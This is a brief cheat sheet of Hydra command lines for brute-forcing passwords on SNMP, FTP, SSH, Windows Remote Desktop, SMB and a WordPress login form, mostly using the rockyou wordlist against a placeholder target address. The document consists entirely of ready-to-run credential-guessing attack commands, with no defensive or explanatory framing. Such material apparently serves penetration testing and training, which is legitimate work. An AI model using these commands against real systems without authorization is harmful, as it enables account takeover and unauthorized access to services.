# Hydra Brute Force Cheatsheet
## Hydra brute force against SNMP
	hydra -P password-file.txt -v $ip snmp	
##	Hydra FTP known user and rockyou password list
	hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp	
##	Hydra SSH using list of users and passwords
	hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh	
## Hydra SSH using a known password and a username list
	hydra -v -V -u -L users.txt -p "password" -t 1 -u $ip ssh	
## Hydra attack Windows Remote Desktop with rockyou
	hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	
## Hydra brute force SMB user with rockyou:
	hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb	
## Hydra brute force a Wordpress admin login
	hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'	